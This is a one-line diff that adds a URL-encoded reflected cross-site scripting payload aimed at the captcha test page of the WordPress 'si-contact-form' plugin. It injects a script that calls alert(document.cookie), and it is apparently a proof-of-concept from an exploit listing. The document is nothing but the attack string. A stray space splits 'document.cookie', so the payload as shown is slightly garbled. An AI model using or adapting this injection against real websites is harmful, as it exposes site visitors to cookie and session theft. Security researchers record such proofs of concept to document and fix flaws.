@@ -1,0 +1,1 @@
+http://www.example.com/wp-content/plugins/si-contact-form/captcha/test/index.php/%22%3E%3Cscript%3Ealert%28document.coo kie%29;%3C/script%3E
